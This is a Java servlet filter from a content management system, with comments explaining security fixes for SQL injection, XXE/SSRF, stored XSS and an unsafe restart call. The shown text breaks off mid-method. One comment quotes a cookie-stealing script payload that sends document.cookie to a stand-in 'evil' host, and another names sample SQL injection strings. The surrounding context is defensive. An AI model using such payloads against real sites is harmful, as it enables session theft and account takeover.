package com.cbsinc.cms;


/**
 * <p>
 * Title: Content Manager System
 * </p>
 * <p>
 * Description: System building web application develop by Konstantin Grabko.
 * Konstantin Grabko is Owner and author this code.
 * You can not use it and you cannot change it without written permission from Konstantin Grabko
 * Email: konstantin.grabko@yahoo.com or konstantin.grabko@gmail.com
 * </p>
 * <p>
 * Copyright: Copyright (c) 2002-2025
 * </p>
 * <p>
 * Company: CENTER BUSINESS SOLUTIONS INC
 * </p>
 *
 * @author Konstantin Grabko
 * @version 1.0
 */

import java.io.CharArrayWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.StringReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Date;
import java.util.Enumeration;
import java.util.PropertyResourceBundle;
import java.util.ResourceBundle;

import javax.xml.transform.Source;
import javax.xml.transform.Templates;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerConfigurationException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;

import org.apache.log4j.Logger;

import com.cbsinc.cms.annotations.DeleteActionRequestMapping;
import com.cbsinc.cms.annotations.GetActionRequestMapping;
import com.cbsinc.cms.annotations.PostActionRequestMapping;
import com.cbsinc.cms.annotations.PutActionRequestMapping;
import com.cbsinc.cms.annotations.Singleton;
import com.cbsinc.cms.controllers.IAction;
import com.cbsinc.cms.controllers.ProductlistAction;
import com.cbsinc.cms.controllers.ServiceLocator;
import com.cbsinc.cms.controllers.SiteRole;
import com.cbsinc.cms.faceds.AuthorizationPageFaced;
import com.cbsinc.cms.faceds.CmsBeansFactoty;
import com.cbsinc.cms.jms.controllers.Message;
import com.cbsinc.cms.jms.controllers.MessageSender;
import com.cbsinc.cms.jms.controllers.StoreCashMessageBean;
import com.cbsinc.cms.utils.FileStorage;

import jakarta.servlet.Filter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.FilterConfig;
import jakarta.servlet.ServletContext;
import jakarta.servlet.ServletOutputStream;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;




/**
 * Filter class
 *
 * @web.filter name="FrontControllers" display-name="Name for FrontControllers"
 *             description="Description for action classes"
 * @web.filter-mapping url-pattern="*.jsp"
 *
 */

public class FrontControllers implements Filter, ITransformationService {

	private static final long serialVersionUID = 1878821936267951407L;

	private FilterConfig filterConfig;

	static private Logger log = Logger.getLogger(FrontControllers.class);



	float beginClearMemory = 30;
	float beginReloadProgramm = 10;
	long cashTimeExpired = 60000;

	ProductlistAction productlistAction = null;
	AuthorizationPageFaced authorizationPageFaced = null;
	ResourceBundle applicationScope = null;
	ServletContext servletContext;

	Runtime runtimec;
	// String path_startup = "/etc/init.d/cmsbo restart" ;
	// String path_shutdown = "";
	String pathRestartScript = "/etc/init.d/cmsbo1";

	public FrontControllers() {
		if (applicationScope == null)
			applicationScope = PropertyResourceBundle.getBundle("application_scope");
	}

	public void init(FilterConfig filterConfig) {
		this.filterConfig = filterConfig;
		servletContext = filterConfig.getServletContext();
		servletContext.setAttribute("user_locale_en",
				PropertyResourceBundle.getBundle("localization", new java.util.Locale("en")));
		servletContext.setAttribute("user_locale_ru",
				PropertyResourceBundle.getBundle("localization", new java.util.Locale("ru")));

		if (System.getProperty("restart") != null)
			pathRestartScript = System.getProperty("restart");

		// path_restart_script
		servletContext.setAttribute("ITransformationService", (ITransformationService) this);

		setCashDir(servletContext);
		setSessionDir(servletContext);
		loadClassesApplicationScope(servletContext);
		try {
			authorizationPageFaced = ServiceLocator.getInstance().getAuthorizationPageFaced();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (!authorizationPageFaced.getSetupResources().getString("begin_clear_memory").equals(""))
			beginClearMemory = Float
					.parseFloat(authorizationPageFaced.getSetupResources().getString("begin_clear_memory").trim());
		if (!authorizationPageFaced.getSetupResources().getString("begin_reload_programm").equals(""))
			beginReloadProgramm = Float
					.parseFloat(authorizationPageFaced.getSetupResources().getString("begin_reload_programm").trim());
		if (!authorizationPageFaced.getSetupResources().getString("cash_time_expired").equals(""))
			cashTimeExpired = Long
					.parseLong(authorizationPageFaced.getSetupResources().getString("cash_time_expired").trim());

		if (!authorizationPageFaced.getSetupResources().getString("cookies_dir").equals(""))
			setCookiesDir(servletContext, authorizationPageFaced.getSetupResources().getString("cookies_dir").trim());

		if (!authorizationPageFaced.getSetupResources().getString("use_cookies").equals(""))
			setUserCookies(servletContext, authorizationPageFaced.getSetupResources().getString("use_cookies").trim());

	}

	public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) {
		Transformer transformer;
		AuthorizationPageBean authorizationPageBeanId = null;

		try {
			// FIX (SQL injection through id parameters): every *_id parameter in
			// this application is a numeric key, but most are copied into beans
			// as strings without validation and then concatenated UNQUOTED into
			// SQL - "where catalog_id = " + catalog_id - so a value such as
			// 1 OR 1=1 or 1 UNION SELECT ... needs no quote character at all.
			// With ~770 concatenation sites, the one place every request passes
			// through is here. A request carrying a non-integer *_id (or offset)
			// is answered with 400 and logged with the parameter name, so a
			// legitimate caller that trips it is easy to spot.
			if (rejectNonNumericIds((HttpServletRequest) request, (HttpServletResponse) response))
				return;

			HttpSession hsession = ((HttpServletRequest) request).getSession(false);
			if (hsession == null)
				hsession = ((HttpServletRequest) request).getSession(true);

			boolean isTransformble = true;
			boolean isActions = true;
			// ++++++++++++++++++++++ start +++++++++++++++++++++++++++++++++++
			String path = ((HttpServletRequest) request).getRequestURI();

			int index = path.lastIndexOf("/") + 1;
			path = path.substring(index);

			isTransformble = authorizationPageFaced.getXsltResources().containsKey(path);
			isActions = authorizationPageFaced.getActionsResources().containsKey(path);

			if (hsession.getAttribute("authorizationPageBeanId") instanceof AuthorizationPageBean) {
				authorizationPageBeanId = ((AuthorizationPageBean) hsession.getAttribute("authorizationPageBeanId"));

				if (authorizationPageBeanId.getStrLogin().length() == 0 || (authorizationPageBeanId.getRoleId() == 0
						&& !authorizationPageBeanId.getStrLogin().equals("user"))) {
					authorizationPageBeanId.setIntUserID(1);
					authorizationPageBeanId.setRoleId(0);
					authorizationPageBeanId.setStrPasswd("user");
					authorizationPageBeanId.setStrLogin("user");
				}

			} else {

				String sessionId = authorizationPageFaced.getCokieSessionId((HttpServletRequest) request,
						(HttpServletResponse) response);
				hsession.setAttribute("cokie_session_id", sessionId);
//						System.out.println("session: " + session_id );
				if (authorizationPageFaced.isCokieSessionIdExists((HttpServletRequest) request,
						(HttpServletResponse) response)
						&& authorizationPageFaced.isLoginFromCookieNew1(sessionId, hsession,
								authorizationPageFaced.getSessionScope()))
//						//if( authorizationPageFaced.isLoginFromCookieFromDir( session_id ,  hsession , servletContext , session_scope ) )
				{
					authorizationPageBeanId = ((AuthorizationPageBean) hsession
							.getAttribute("authorizationPageBeanId"));
				} else {
					loadClassesSessionScope(hsession);
					authorizationPageBeanId = ((AuthorizationPageBean) hsession
							.getAttribute("authorizationPageBeanId"));

					String host = ((HttpServletRequest) request).getServerName();
					String siteId = authorizationPageFaced.getSiteIdByHost(host);
					authorizationPageBeanId.setSiteId(siteId, authorizationPageFaced);
//							authorizationPageBeanId.setSite_id(SiteType.MAIN_SITE,authorizationPageFaced);
					authorizationPageBeanId.setIntUserID(1);
					authorizationPageBeanId.setRoleId(0);
					authorizationPageBeanId.setStrLogin(SiteRole.GUEST);
					authorizationPageBeanId.setStrPasswd(SiteRole.GUEST_PASSWORD);

				}

				// authorizationPageBeanId.setLocale("ru",servletContext);
				authorizationPageBeanId.setLocale("en", servletContext);
				String sitePath = filterConfig.getServletContext().getRealPath("/") + "xsl" + File.separatorChar
						+ authorizationPageBeanId.getSiteDir();
				hsession.setAttribute("site_path", sitePath);

				if (authorizationPageBeanId.getSiteId().equals("2"))
					authorizationPageBeanId.setStrMessage(authorizationPageBeanId.getLocalization(servletContext)
							.getString("message_for_new_session"));

			}






		        String userAgent = ((HttpServletRequest) request).getHeader("User-Agent");
		        if (userAgent != null && (userAgent.contains("Mobile") || userAgent.contains("Android") || userAgent.contains("iPhone"))) {
		        	authorizationPageBeanId.setMobileSession(true);
		        	log.info(userAgent);
		        } else {
		        	authorizationPageBeanId.setMobileSession(false);
		        }



//				if(((HttpServletRequest) request).getQueryString() != null)
//				{
//				authorizationPageBeanId.setLastVisitedPage(((HttpServletRequest) request).getRequestURI() + "?" + ((HttpServletRequest) request).getQueryString()) ;
//				}

			if (!isTransformble && !isActions) {
				filterChain.doFilter(request, response);
				return;
			}

			// ++++++++++++++++++++ end +++++++++++++++++++++++++++++++++++++

			// String pathInfo = path + ".html";
			String pathInfo = "";
			if (authorizationPageBeanId.getStrLogin().equals("user")
					&& authorizationPageFaced.getSetupResources().getString("docash").equals("true")
					&& ((HttpServletRequest) request).getMethod().equals("GET")
					&& ((HttpServletRequest) request).getParameter("site") == null) {
				pathInfo = path + "_" + buildCashPageName((HttpServletRequest) request, path) + ".html";
				String cashPage = getCashDir(servletContext) + File.separatorChar + pathInfo;
				File fileCashPage = new File(cashPage);

				if (fileCashPage.exists()) {
					long expiredTime = fileCashPage.lastModified() + cashTimeExpired;
					long curentTime = new Date().getTime();
					if (expiredTime > curentTime) {
						((HttpServletRequest) request).getRequestDispatcher("cashes" + File.separatorChar + pathInfo)
								.forward(request, response);
						// filterChain.doFilter(request, response);
						return;
					}
				}
			}

			if (hsession != null) {

				((HttpServletResponse) response).setHeader("Cache-Control", "no-cache"); // HTTP 1.1
				((HttpServletResponse) response).setHeader("Pragma", "no-cache"); // HTTP 1.0
				((HttpServletResponse) response).setDateHeader("Expires", 0); // prevents caching at the proxy server

				if (isActions) {
					// FIX (cross-request state bleed, pass 39 item 17):
					// the controller instance used to be cached per path in a shared map and
					// reused for every request. The controllers are not stateless -- they keep
					// per-request values in instance fields (authorizationPageBeanId,
					// publisherBeanId, session, productlistBeanId, notselected, gen_code, ...),
					// assigned inside action() and read afterwards in doGet/doPost. With a single
					// shared instance, two overlapping requests overwrite each other's fields, so
					// a request could finish using another user's AuthorizationPageBean.
					//
					// Creating a fresh controller per request removes the sharing at its source,
					// instead of trying to make ~76 controllers individually thread-safe. The cost
					// is one small allocation: Class.forName is served from the classloader cache
					// and the constructors only read an already-cached ResourceBundle.
					String controllerClassName = authorizationPageFaced.getActionsResources().getString(path);
					Object obj = createObject(controllerClassName);
					if (obj == null)
						throw new Exception("Class " + controllerClassName + " is not found.");

					if (obj != null) {
						if (response.isCommitted())
							return;

						// Dependency injection by type for class variables
						for (Field f : obj.getClass().getDeclaredFields()) {
							Singleton singleton = f.getAnnotation(Singleton.class);
							if (singleton != null) {
								String className = f.getType().getName();
								// String className = obj.getClass().getName();
								Object value = CmsBeansFactoty.getInstance().getBean(className);
								f.setAccessible(true);
								f.set(obj, value);
							}

						}

						boolean isInvoke = false ;
						final long controllerStart = com.cbsinc.cms.utils.Latency.start();
						try {

						for (Method method : obj.getClass().getDeclaredMethods()) {
							 HttpServletRequest httpRequest = (HttpServletRequest) request ;
							 HttpServletResponse httpResponse = (HttpServletResponse) response ;
							 if (method.isAnnotationPresent(PostActionRequestMapping.class) && httpRequest.getMethod().equalsIgnoreCase("POST")) {
								 PostActionRequestMapping postAction = method.getAnnotation(PostActionRequestMapping.class) ;
								    String controllerActionName = postAction.action() ;
								    String actionName = httpRequest.getParameter("action");
								    if( controllerActionName != null && actionName != null && controllerActionName.equals(actionName) ) {
						            method.setAccessible(true);
						            method.invoke(obj, httpRequest, httpResponse , servletContext );
						            isInvoke = true ;
						            break ;
								    }
						      }
							  else if (method.isAnnotationPresent(GetActionRequestMapping.class) && httpRequest.getMethod().equalsIgnoreCase("GET")) {
								  GetActionRequestMapping getAction = method.getAnnotation(GetActionRequestMapping.class) ;
								    String controllerActionName = getAction.action() ;
								    String actionName = httpRequest.getParameter("action");
								    if( controllerActionName != null && actionName != null && controllerActionName.equals(actionName) ) {
						            method.setAccessible(true);
						            method.invoke(obj, httpRequest, httpResponse , servletContext );
						            isInvoke = true ;
						            break ;
								    }
						      }
							  else if (method.isAnnotationPresent(PutActionRequestMapping.class) && httpRequest.getMethod().equalsIgnoreCase("PUT")) {
								  PutActionRequestMapping putAction = method.getAnnotation(PutActionRequestMapping.class) ;
								    String controllerActionName = putAction.action() ;
								    String actionName = httpRequest.getParameter("action");
								    if( controllerActionName != null && actionName != null && controllerActionName.equals(actionName) ) {
						            method.setAccessible(true);
						            method.invoke(obj, httpRequest, httpResponse , servletContext );
						            isInvoke = true ;
						            break ;
								    }
						      }
							  else if (method.isAnnotationPresent(DeleteActionRequestMapping.class) && httpRequest.getMethod().equalsIgnoreCase("DELETE") ) {
								  DeleteActionRequestMapping deleteAction = method.getAnnotation(DeleteActionRequestMapping.class) ;
								    String controllerActionName = deleteAction.action() ;
								    String actionName = httpRequest.getParameter("action");
								    if( controllerActionName != null && actionName != null && controllerActionName.equals(actionName) ) {
						            method.setAccessible(true);
						            method.invoke(obj, httpRequest, httpResponse , servletContext );
						            isInvoke = true ;
						            break ;
								    }
						      }

						}

						if (isInvoke) log.info("action method invoked in class: " + obj.getClass().getCanonicalName());
						else if (((HttpServletRequest) request).getMethod().toUpperCase().compareTo("POST") == 0)
							((IAction) obj).doPost((HttpServletRequest) request, (HttpServletResponse) response, servletContext);
						else
							((IAction) obj).doGet((HttpServletRequest) request, (HttpServletResponse) response, servletContext);
						} finally {
							HttpServletRequest timedRequest = (HttpServletRequest) request;
							com.cbsinc.cms.utils.Latency.method(obj.getClass().getSimpleName() + " " + timedRequest.getMethod()
									+ " action=" + timedRequest.getParameter("action") + " " + timedRequest.getRequestURI(), controllerStart);
						}
					}

					isClearMemory();
				}

				if (isTransformble) {

					if (response.isCommitted())
						return;

					Templates cachedXSLT = null;
					if (!authorizationPageFaced.getTransformerMap().containsKey(authorizationPageBeanId.getSiteDir()
							+ File.separatorChar + path + authorizationPageBeanId.getLocale())) {
						String xsltPageDefault = "xsl" + File.separatorChar + authorizationPageBeanId.getSiteDir()
								+ File.separatorChar + authorizationPageFaced.getXsltResources().getString(path);
						String xsltpathDefault = filterConfig.getServletContext().getRealPath("/" + xsltPageDefault);
						String xsltPage = "xsl" + File.separatorChar + authorizationPageBeanId.getSiteDir()
								+ File.separatorChar + authorizationPageBeanId.getLocale() + File.separatorChar
								+ authorizationPageFaced.getXsltResources().getString(path);
						String xsltpath = filterConfig.getServletContext().getRealPath("/" + xsltPage);
						Source styleSource = null;
						try {
							File file = new File(xsltpath);
							if (file == null || !file.exists())
								file = new File(xsltpathDefault);
							styleSource = new StreamSource(file);

						} catch (Exception e) {
							throw e;
						}
						TransformerFactory transformerFactory = TransformerFactory.newInstance();
						// FIX (XXE / SSRF): the factory was left at its defaults, so a
						// stylesheet could pull in an external DTD or another stylesheet
						// via <!DOCTYPE ... SYSTEM "...">, document() or xsl:import with
						// an absolute path or http URL. That reads local files and makes
						// outbound requests from the server. The stylesheets live in
						// xsl/ and reference each other by relative path, which keeps
						// working; only absolute and remote references are refused.
						transformerFactory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, "");
						transformerFactory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

						try {
							cachedXSLT = transformerFactory.newTemplates(styleSource);
						} catch (TransformerConfigurationException e) {
							throw e;
						}

						if (cachedXSLT == null)
							throw new Exception("Class Templates == null for xslt page " + path);
						authorizationPageFaced.getTransformerMap().put(authorizationPageBeanId.getSiteDir()
								+ File.separatorChar + path + authorizationPageBeanId.getLocale(), cachedXSLT);
					} else
						cachedXSLT = (Templates) authorizationPageFaced.getTransformerMap()
								.get(authorizationPageBeanId.getSiteDir() + File.separatorChar + path
										+ authorizationPageBeanId.getLocale());

					try {
						transformer = cachedXSLT.newTransformer();
					} catch (TransformerConfigurationException e) {
						throw e;
					}

					String htmlData = "";
					String xmlData = "";
					byte[] htmlBytes = new byte[0];

					response.setCharacterEncoding("UTF-8");
					ServletOutputStream out = response.getOutputStream();
					CharResponseWrapper responseWrapper = new CharResponseWrapper((HttpServletResponse) response);
					filterChain.doFilter(request, responseWrapper);
					xmlData = new String(responseWrapper.getData()).trim();

					xmlData = xmlData.replaceAll("<r>", "<r><![CDATA[ ");
					xmlData = xmlData.replaceAll("</r>", " ]]></r>");

					// saveXMLFile("xml_" + path , xmlData ) ; // save

					StringReader sr = new StringReader(xmlData);
					CharArrayWriter caw = new CharArrayWriter();
					StreamResult result = new StreamResult(caw);
					try {
						Source xmlSource = new StreamSource(sr);
						transformer.transform(xmlSource, result);
						htmlData = caw.toString();
						// FIX (stored XSS): the two lines removed here were
						//     htmlData = htmlData.replaceAll("&lt;", "<");
						//     htmlData = htmlData.replaceAll("&gt;", ">");
						// They ran over the WHOLE transformed document and undid
						// every bit of escaping the stylesheet had just produced.
						// Any text that reached the page through the XML - product
						// titles, shop names, reviews, user profile fields - became
						// live markup again, so a stored value such as
						//     &lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;
						// was served back as an executable <script> tag to every
						// visitor of that page. Session cookies for this app are not
						// HttpOnly, so that is a full account takeover.
						//
						// Pages that legitimately need to emit raw HTML already have
						// a mechanism: the <r> element, wrapped in CDATA a few lines
						// above. Content inside <r>...</r> still passes through
						// untouched. Nothing else should.
						htmlBytes = htmlData.getBytes("UTF-8");
						if (out != null)
							out.write(htmlBytes);
						// out.flush();

						if (authorizationPageBeanId.getStrLogin().equals("user")
								&& authorizationPageFaced.getSetupResources().getString("docash").equals("true")
								&& ((HttpServletRequest) request).getMethod().equals("GET")
								&& ((HttpServletRequest) request).getParameter("site") == null) {
							MessageSender mqSender = new MessageSender(hsession, StoreCashMessageBean.messageQuery);
							Message message = new Message();
							message.put("cashPageName", pathInfo);
							message.put("cashPageBodyByteArray", htmlBytes);
							mqSender.send(message);
						}

					} catch (Exception ex) {
						System.out.println(xmlData);
						System.out.println(ex.toString());
						throw ex;
						// out.write(responseWrapper.toString());
					} finally {

						// System.out.println(xmlData);
						caw.close();
						sr.close();
						out.close();
						responseWrapper.close();
					}
					return;
				}

				// FIX (Cannot create a session after the response has been committed):
				// when a controller answers with a redirect the response is already
				// committed. logoff() invalidates the session and then calls
				// sendRedirect(...) to Productlist.jsp, and this filter still chained
				// the request on to the JSP. The JSP asked for a session of its own -
				// the previous one had just been invalidated - and creating a session
				// after the response is committed throws IllegalStateException, so
				// every logoff logged a stack trace while the redirect itself worked.
				// Once the response is committed there is nothing left to render: the
				// status and headers are already on the wire (the same guard already
				// exists before the XSLT branch above).
				if (((HttpServletResponse) response).isCommitted())
					return;

				filterChain.doFilter(request, response);
				// hsession.invalidate();

			}

		} catch (IOException iox) {
			// FIX: was printStackTrace() + servletContext.log(getMessage()) +
			// System.gc(), then fell through to the end of doFilter. Three problems:
			//  - getMessage() is null for NPE and most ClassCastExceptions, so the
			//    log call itself could fail and bury the original exception;
			//  - System.gc() on an error path stops the world on every failing
			//    request, turning one broken page into a site-wide stall;
			//  - falling through meant the client got HTTP 200 with an empty body.
			//    Browsers cached that, monitoring saw a healthy site, and the only
			//    trace of the failure was in the log.
			reportFailure(request, response, iox);
		} catch (Exception iox) {
			reportFailure(request, response, iox);
		}

		catch (OutOfMemoryError e) {
			// FIX: this used to end with reloadServer(), which runs
			//     Runtime.getRuntime().exec("/etc/init.d/cmsbo1")
			// One request that allocated too much therefore restarted the whole
			// container: every other user's in-flight request was dropped and every
			// session lost. An OOM in one thread does not mean the JVM is unusable,
			// and if it truly is, restarting is the supervisor's job (systemd,
			// Docker restart policy, Kubernetes liveness probe) - not something a
			// request thread should decide while the heap is exhausted.
			// The error is logged and rethrown so the container can deal with it.
			log.error("OutOfMemoryError while handling " + describeRequest(request), e);
			throw e;
		}

		// isClearMemory();
	}

	public Object createObject(String className) {
		Object obj = null;
		try {
			Class cls = Class.forName(className);
			obj = cls.newInstance();
		} catch (Exception ex) {
			log.error(ex);
		}
		return obj;
	}

	public Object createObjectFromThread(String className) {
		Object obj = null;
		try {
			final Class<?> serviceImplClass = Thread.currentThread().getContextClassLoader().loadClass(className);

//				if (!clazz.isAssignableFrom(serviceImplClass)) {
//				throw new ServiceFactoryException("Service " + serviceImplClassName + " does not implement "
//				+ clazz.getCanonicalName());
//				}
			obj = ((Class) serviceImplClass).newInstance();
		} catch (Exception ex) {
			log.error(ex);
		}

		return obj;
	}

//	boolean isExistKey(Enumeration en , String key)
//	{
//		while(en.hasMoreElements())
//		{
//		String _key = (String)en.nextElement() ;
//		if( _key.equals(key)) return true ;
//		}
//
//		return false ;
//	}

	public boolean isClearMemory() {
		long max;
		long total;
		long free;
		boolean result = false;

		if (runtimec == null)
			runtimec = Runtime.getRuntime();

		max = runtimec.maxMemory();
		total = runtimec.totalMemory();
		free = runtimec.freeMemory();

		// String sitePath = filterConfig.getServletContext().getRealPath("/") ;
		// int cut = sitePath.indexOf("webapps") ;
		// sitePath = sitePath.substring(0,cut) ;
		// path_startup = sitePath + "bin\\startup.bat" ;
		// path_shutdown = sitePath + "bin\\shutdown.bat" ;

		float persent = (float) free / (float) total * 100;

		// FIX: this method is called from doFilter on EVERY request. It used to
		// print six lines to stdout each time, which on a busy site is the bulk of
		// catalina.out and makes the log useless for finding real problems.
		// Demoted to a single debug line.
		if (log.isDebugEnabled())
			log.debug("memory max=" + max + " total=" + total + " free=" + free + " free%=" + persent);

		if (persent < beginClearMemory) {
			// FIX: System.gc() removed. It was called on every request once free
			// memory dipped below the threshold - exactly when the server is
			// already under pressure - and a full GC pauses all request threads.
			// The collector reclaims this memory on its own; forcing it made the
			// stall it was meant to prevent.
			log.warn("Free heap is " + persent + "%, below begin_clear_memory=" + beginClearMemory);
			result = true;
		}

		if (persent < beginReloadProgramm) {
			// The restart call here was already commented out by the author.
			// Restarting is left to the process supervisor; see the OutOfMemoryError
			// handler in doFilter.
			log.error("Free heap is " + persent + "%, below begin_reload_programm=" + beginReloadProgramm
					+ ". Process supervision should decide whether to restart.");
			result = true;
		}

		return result;
	}

	/**
	 * No longer restarts anything.
	 *
	 * FIX: this method ran Runtime.exec(path_restart_script), where
	 * path_restart_script defaults to "/etc/init.d/cmsbo1" and can be overridden
	 * by the "restart" system property. Its only caller was the OutOfMemoryError
	 * handler in doFilter, so a single oversized request bounced the container
	 * and took every other user's session with it. Two further problems made it
	 * worse: exec() during heap exhaustion needs to fork the JVM and usually
	 * fails anyway, and the script path is attacker-influenced if the process is
	 * ever started with an untrusted -Drestart value.
	 *
	 * The method is kept so that any external caller still links, but it now only
	 * records the request. Restart policy belongs to whatever supervises the
	 * process - systemd Restart=, a Docker restart policy, or a Kubernetes
	 * liveness probe against /health, which this application already exposes.
	 *
	 * @return always false; no restart is performed
	 * @deprecated let the process supervisor handle restarts
	 */
	@Deprecated
	public boolean reloadServer() {
		log.error("reloadServer() was called. In-process restart is disabled; "
				+ "configure process supervision to restart on failure of the /health endpoint.");
		return false;
	}

	void loadClassesApplicationScope(ServletContext application) {
		String key = "";
		Enumeration enumeration;
		try {
			enumeration = applicationScope.getKeys();
			while (enumeration.hasMoreElements()) {
				key = (String) enumeration.nextElement();
				Object obj = createObject(applicationScope.getString(key).trim());
				application.setAttribute(key, obj);
			}
		} catch (Exception e) {
			log.error(e);
		}
	}

	void loadClassesSessionScope(HttpSession session) {
		String key = "";
		Enumeration enumeration;
		try {
			enumeration = authorizationPageFaced.getSessionScope().getKeys();
			while (enumeration.hasMoreElements()) {
				key = (String) enumeration.nextElement();
				Object obj = createObject(authorizationPageFaced.getSessionScope().getString(key).trim());
				session.setAttribute(key, obj);
			}
		} catch (Exception e) {
			log.error(e);
		}
	}

	public void destroy() {



//		StringBuffer hosts_for_dns = new StringBuffer();
//		File file =  new File("/") ;
//		 String server_config = System.getProperty("conf");
//		 if(server_config == null || server_config.length() == 0)
//		 {
//			 String dir = System.getProperty("user.dir");
//			 dir = dir.substring(0 ,dir.indexOf("bin")) + "conf" + File.separatorChar+"server.xml" ;
//			//File f = new File("C:/apache-tomcat-6.0.14/conf/server.xml") ;
//			file = new File(dir) ;
//		 }
//		 else
//		 {
//			 file = new File(server_config) ;
//		 }
//
//		QueryManager Adp = null ;
//		AddAliase addAliase = new AddAliase();
//		Document doc = null ;
//		String query = "select host  from site" ;
//		//String query = "select site_dir  from site" ;
//		//String host = "www.online-spb.com" ;
//		String host = "www.siteoneclick.com" ;
//		String aliase = "" ;
//
//		try
//		{
//
//
//
//			Adp = new QueryManager();
//			if(Adp == null)return ;
//			doc = addAliase.loadConfig(file);
//			addAliase.RemoveAllAliase(doc, host) ;
//
//			Adp.executeQuery(query);
//			for (int i = 0; Adp.rows().size() > i; i++)
//			{
//				aliase =  Adp.getValueAt(i, 0);
//				addAliase.AddAliaseToHost(doc, host, aliase) ;
//				int indexof = aliase.indexOf(".irr.bz");
//				if(indexof != -1)
//				{
//					hosts_for_dns.append(aliase.substring(0,indexof));
//					hosts_for_dns.append(" A 0 78.37.191.193 86400\n");
//				}
//			}
//			addAliase.writeXmlFile(doc,file);
//		}
//		catch (SQLException e)
//		{
//			log.error(e);
//		}
//		catch (Exception e)
//		{
//			System.out.println(" server config: " + file.getPath());
//			log.error(e);
//		}
//		finally
//		{
//			if(Adp != null )
//			{
//			Adp.close();
//			DomainRegister r = new DomainRegister();
//			//r.getSiteIdByHost("");
//			String auth = r.getAuth() ;
//			r.setDomainAliases("irr.bz" , hosts_for_dns.toString() ,auth );
//			System.out.println(r.getPostCommand(auth));
//			}
//
//		}

	}

	void setCashDir(ServletContext servletContext) {
		try {

			//String pageStorePath = this.getClass().getResource("").getPath();
			//pageStorePath = pageStorePath.substring(1, pageStorePath.indexOf("/WEB-INF/"));
			String path = FileStorage.getInstance().getPath() ;
			File file = new File(path + File.separatorChar + "cashes");
			if (!file.exists()) {
				file.mkdirs();
			}
			servletContext.setAttribute("cash_dir", file.getPath());
		} catch (Exception e) {
			log.error(e);
		}

	}

	String getCashDir(ServletContext servletContext) {
		return (String) servletContext.getAttribute("cash_dir");
	}

	void setSessionDir(ServletContext servletContext) {
		try {
			//String pageStorePath = this.getClass().getResource("").getPath();
			//pageStorePath = pageStorePath.substring(1, pageStorePath.indexOf("/WEB-INF/"));
			String path = FileStorage.getInstance().getPath() ;
			File file = new File(path + File.separatorChar + "sessions");
			if (!file.exists()) {
				file.mkdirs();
			}

			servletContext.setAttribute("session_dir", file.getPath());
		} catch (Exception e) {
			log.error(e);
		}
	}

	String getSessionDir(ServletContext servletContext) {
		return (String) servletContext.getAttribute("session_dir");
	}

	private static final java.util.regex.Pattern NUMERIC_ID = java.util.regex.Pattern.compile("-?[0-9]{1,18}");

	/**
	 * Checks that every request parameter whose name ends in "_id", plus "offset",
	 * is a plain integer. Empty values are allowed; the actions treat them as
	 * "not supplied". Anything else gets HTTP 400.
	 *
	 * @return true if the request was rejected and the response is complete
	 */
	private boolean rejectNonNumericIds(HttpServletRequest request, HttpServletResponse response) throws IOException {
		java.util.Map<String, String[]> params = request.getParameterMap();
		for (java.util.Map.Entry<String, String[]> e : params.entrySet()) {
			String name = e.getKey();
			if (!(name.endsWith("_id") || name.equals("offset")))
				continue;
			// Stripe's Checkout Session id ("cs_...") comes back on /stripe/return
			// as session_id; it is validated by StripeReturnServlet itself.
			if (name.equals("session_id"))
				continue;
			for (String value : e.getValue()) {
				if (value == null || value.isEmpty())
					continue;
				if (!NUMERIC_ID.matcher(value.trim()).matches()) {
					log.warn("Rejected request: parameter '" + name + "' is not numeric; " + describeRequest(request));
					if (!response.isCommitted())
						response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Parameter '" + name + "' must be numeric");
					return true;
				}
			}
		}
		return false;
	}

	/**
	 * Logs a request failure and, if nothing has been written yet, returns a real
	 * HTTP 500 to the caller instead of an empty 200.
	 */
	private void reportFailure(ServletRequest request, ServletResponse response, Exception e) {
		log.error("Request failed: " + describeRequest(request), e);
		if (filterConfig != null) {
			String message = e.getMessage();
			filterConfig.getServletContext().log(message == null ? e.getClass().getName() : message, e);
		}
		if (response instanceof HttpServletResponse && !response.isCommitted()) {
			try {
				((HttpServletResponse) response).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			} catch (IOException ignored) {
				// Client already gone; the log entry above is the record.
			}
		}
	}

	/**
	 * Builds a short "METHOD uri from ip" string for log messages.
	 */
	private String describeRequest(ServletRequest request) {
		if (!(request instanceof HttpServletRequest))
			return "non-HTTP request";
		HttpServletRequest httpRequest = (HttpServletRequest) request;
		String query = httpRequest.getQueryString();
		return httpRequest.getMethod() + " " + httpRequest.getRequestURI() + (query == null ? "" : "?" + query)
				+ " from " + httpRequest.getRemoteAddr();
	}

	/**
	 * Turns a cache key of arbitrary content into a filename-safe token.
	 *
	 * The result contains only [0-9a-f] and is of bounded length, so it cannot
	 * contain a path separator, "..", a NUL byte, or anything else that would let
	 * a request steer the cache file outside the cache directory. SHA-256 is used
	 * rather than String.hashCode() because hashCode is 32-bit and trivially
	 * collided, and two different searches sharing a cache entry would serve one
	 * user's filtered result set to another.
	 *
	 * @param key raw cache key, may contain any character
	 * @return lowercase hex token, safe to concatenate into a path
	 */
	static String hashCashKey(String key) {
		try {
			java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
			byte[] hash = digest.digest(key.getBytes("UTF-8"));
			StringBuilder hex = new StringBuilder(hash.length * 2);
			for (byte b : hash)
				hex.append(Character.forDigit((b >> 4) & 0xF, 16)).append(Character.forDigit(b & 0xF, 16));
			return hex.toString();
		} catch (java.security.NoSuchAlgorithmException | UnsupportedEncodingException e) {
